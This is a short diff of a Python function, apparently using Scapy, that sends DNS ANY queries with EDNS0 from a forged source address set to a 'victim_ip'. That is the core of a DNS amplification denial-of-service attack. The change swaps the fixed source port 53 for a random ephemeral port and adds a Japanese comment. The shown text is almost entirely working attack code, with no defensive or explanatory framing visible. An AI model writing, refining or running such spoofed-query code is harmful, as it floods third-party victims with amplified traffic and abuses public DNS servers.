@@ -6,8 +6,9 @@ def send_spoofed_dns_any_edns0(victim_ip, dns_server_ip, qname, count=5, interva
     print(f"[+] Sending {count} spoofed DNS ANY queries with EDNS0 for '{qname}' from {victim_ip} to {dns_server_ip}")
 
     for i in range(count):
-        transaction_id = random.randint(1, 65535) 
-        sport=53
+        transaction_id = random.randint(1, 65535)
+        sport = random.randint(1024, 65535)  # ランダムな高ポート（ephemeral port）
+
         # IP + UDPヘッダ
         ip = IP(src=victim_ip, dst=dns_server_ip)
         udp = UDP(sport=sport, dport=53)
